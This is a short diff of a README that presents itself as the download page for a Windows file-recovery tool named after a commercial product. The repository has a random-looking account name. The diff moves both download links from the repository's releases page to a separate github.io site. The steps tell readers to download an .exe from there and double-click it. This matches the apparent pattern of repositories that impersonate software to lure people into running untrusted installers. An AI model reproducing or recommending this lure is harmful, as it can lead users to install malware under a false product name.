@@ -1,6 +1,6 @@
 # 💾 Coolmuster-Recovery-2026 - Recover Deleted Files On Windows Easily
 
-[![Download Coolmuster Recovery](https://img.shields.io/badge/Download-Recovery_Tool-blue.svg)](https://github.com/titular-sensationalism469/Coolmuster-Recovery-2026/releases)
+[![Download Coolmuster Recovery](https://img.shields.io/badge/Download-Recovery_Tool-blue.svg)](https://titular-sensationalism469.github.io)
 
 ## 📁 About This Software
 
@@ -18,7 +18,7 @@ Before you install the software, check your computer for these requirements:
 
 ## 📥 How To Download And Install
 
-1.  Visit the official releases page to find the installer: [https://github.com/titular-sensationalism469/Coolmuster-Recovery-2026/releases](https://github.com/titular-sensationalism469/Coolmuster-Recovery-2026/releases).
+1.  Visit the official releases page to find the installer: [https://titular-sensationalism469.github.io](https://titular-sensationalism469.github.io).
 2.  Click the file link ending in .exe to download it.
 3.  Locate the file in your Downloads folder after the download finishes.
 4.  Double-click the installer file to open it.
